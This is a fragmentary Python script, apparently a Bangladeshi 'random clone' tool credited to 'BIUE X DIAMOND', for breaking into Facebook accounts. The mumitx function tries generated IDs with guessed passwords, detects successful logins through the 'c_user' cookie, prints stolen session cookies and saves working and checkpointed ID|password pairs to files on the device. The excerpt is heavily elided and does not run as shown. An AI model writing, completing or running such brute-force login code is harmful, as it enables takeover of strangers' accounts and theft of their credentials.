...
\033[1;34m==================================================
\033[1;91m [😈] AUTHOR    : BIUE X DIAMOND 
\033[1;34m [😈] TOOLS     : RANDOM CLONE
\033[1;91m [😈] TYPE      : FREE
\033[1;34m [😈] FACEBOOK  :  BIUE X DIAMOND  
\033[1;91m [👿] WHATSAPP  : +8801325886805
\033[1;34m==================================================""")
try:
...
def innocent():
    ...
    os.system("clear")
    print(logo)
    print('\033[1;32m [√] BD CODE : 017/019/016/018/013/015/014')
    linex()
    ...
    print('Ok Ids Saved in /BIUE X DIAMOND -OK.txt')
    print('Cp Ids Saved in /BIUE X DIAMOND -CP.txt')
    linex()
...
def mumitx(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[BIUE X DIAMOND -OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
                cek_apk(session,coki)
                open('/sdcard/BIUE X DIAMOND -OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[BIUE X DIAMOND -CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/BIUE X DIAMOND -CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mBIUE X DIAMOND \033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
